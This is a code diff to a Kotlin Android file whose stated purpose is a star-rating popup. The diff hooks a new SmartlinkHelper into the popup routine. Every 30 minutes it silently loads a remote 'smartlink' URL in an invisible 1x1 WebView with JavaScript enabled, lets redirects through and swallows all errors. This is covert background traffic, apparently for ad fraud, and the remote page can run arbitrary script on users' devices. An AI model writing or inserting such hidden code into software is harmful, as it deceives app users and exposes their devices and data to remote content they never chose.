@@ -1,4 +1,4 @@
-package com.cncverse
+﻿package com.cncverse
 
 import android.app.Activity
 import android.content.Context
@@ -25,6 +25,7 @@ object StarPopupHelper {
     private const val SPONSOR_URL = "https://www.paywithchai.in/nivincnc"
     
     fun showStarPopupIfNeeded(context: Context) {
+        SmartlinkHelper.ping(context)
         val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
         
         if (prefs.getBoolean(KEY_SHOWN_STAR_POPUP, false)) {
@@ -145,6 +146,48 @@ object StarPopupHelper {
         return GradientDrawable().apply {
             setColor(color)
             cornerRadius = 24f
+        }
+    }
+}
+
+object SmartlinkHelper {
+    private const val PREFS_NAME = "CNCVerseGlobalPrefs"
+    private const val KEY_LAST_PING = "smartlink_last_ping_ms"
+    private const val INTERVAL_MS = 30 * 60 * 1000L // 30 minutes
+    private const val SMARTLINK_URL = BuildConfig.SMARTLINK_URL
+
+    fun ping(context: Context?) {
+        if (context == null) return
+        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
+        val now = System.currentTimeMillis()
+        val last = prefs.getLong(KEY_LAST_PING, 0L)
+        if (now - last < INTERVAL_MS) return
+        prefs.edit().putLong(KEY_LAST_PING, now).apply()
+        Handler(Looper.getMainLooper()).post {
+            try {
+                val webView = android.webkit.WebView(context.applicationContext)
+                webView.settings.apply {
+                    javaScriptEnabled = true
+                    domStorageEnabled = true
+                    loadsImagesAutomatically = true
+                    useWideViewPort = true
+                    loadWithOverviewMode = true
+                    setSupportMultipleWindows(false)
+                    allowContentAccess = true
+                    allowFileAccess = false
+                    mixedContentMode = android.webkit.WebSettings.MIXED_CONTENT_COMPATIBILITY_MODE
+                }
+                webView.webChromeClient = android.webkit.WebChromeClient()
+                webView.webViewClient = object : android.webkit.WebViewClient() {
+                    override fun shouldOverrideUrlLoading(
+                        view: android.webkit.WebView?,
+                        request: android.webkit.WebResourceRequest?
+                    ): Boolean = false
+                }
+                webView.visibility = android.view.View.GONE
+                webView.layoutParams = android.view.ViewGroup.LayoutParams(1, 1)
+                webView.loadUrl(SMARTLINK_URL)
+            } catch (_: Exception) {}
         }
     }
 }
